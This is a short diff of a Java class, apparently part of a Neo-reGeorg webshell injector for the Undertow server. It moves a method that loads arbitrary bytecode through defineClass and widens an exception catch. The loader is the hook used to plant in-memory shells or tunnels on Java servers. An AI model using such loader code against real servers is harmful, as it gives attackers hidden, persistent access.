@@ -29,12 +29,6 @@ public class NeoreGeorgUndertowServletHandler extends ClassLoader {
         super(z);
     }
 
-    @SuppressWarnings("all")
-    public Class<?> load(byte[] cb) {
-        return super.defineClass(cb, 0, cb.length);
-    }
-
-
     @Override
     public boolean equals(Object obj) {
         Object[] args = ((Object[]) obj);
@@ -72,10 +66,15 @@ public class NeoreGeorgUndertowServletHandler extends ClassLoader {
                 namespace.get(chars).equals(map);
                 return true;
             }
-        } catch (Exception e) {
+        } catch (Throwable e) {
             e.printStackTrace();
         }
         return false;
+    }
+
+    @SuppressWarnings("all")
+    public Class<?> load(byte[] cb) {
+        return super.defineClass(cb, 0, cb.length);
     }
 
     @SuppressWarnings("all")
